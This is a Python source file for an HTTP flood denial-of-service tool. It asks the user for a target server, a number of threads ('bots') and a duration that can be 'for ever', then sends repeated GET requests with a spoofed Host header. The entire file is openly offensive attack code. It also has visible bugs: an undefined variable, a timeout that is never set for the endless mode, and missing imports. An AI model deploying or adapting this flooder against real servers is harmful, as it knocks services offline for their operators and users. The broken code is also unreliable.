"""
@author: azseza
HTTP flood attack declared in go file as a shared library
"""
import threading
import socket
import time
from .validators import *

class HttpFood():
    """
    The golang httpFlood attack lunch
    """
    def __init__(self):
        self.target = ""
        self.numberOfBots = 12
        self.headers = []
        self.choiceH = ""
        self.period = ""
        self.fake_ip = '182.21.20.32'
        self.port = 80
    
    def setConf(self):
        questions = [
            {
                'type': 'input',
                'name': 'target',
                'message': 'Target Server Adress',
                'validate': TargetValidator
            },
            {
                'type': 'input',
                'name': 'nob',
                'message': 'Number of Bots (Threads)',
                'validate': IntValidator
            },
            {
                'type': 'list',
                'name': 'headers',
                'message': 'choose the flavor of headers !',
                'choices': ['GET', 'POST']        
            }, 
            {
                'type': 'list',
                'name': 'period',
                'message': 'For how long  do you want the attack going?',
                'choices': ['1 minute','for ever']
            }
        ]
        answers = prompt(questions, style=style)
        self.target = answers.get("target")
        self.numberOfBots = answers.get("nob")
        self.choiceH = answers.get("headers")
        self.period = answers.get("period")
    
    def sendReq(self, target):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, self.port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, self.port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, self.port))
        s.close()
        
    def run(self):
        try:
            if self.period == "1 minute":
                timeout = time.time() + 60
            while True:
                if time.time() > timeout:
                    break
                th_num = 0
                th_num_mutex = threading.Lock()
                all_threads = []
                for i in range(int(self.numberOfBots)):
                    t1 = threading.Thread(target=self.sendReq, args=(self.target,))
                    t1.start()
                    all_threads.append(t1)
                for cur_threads in all_threads:
                    cur_threads.join()
        except KeyboardInterrupt:
            print("exit here")
        finally:
            print("Close some multithreading here")



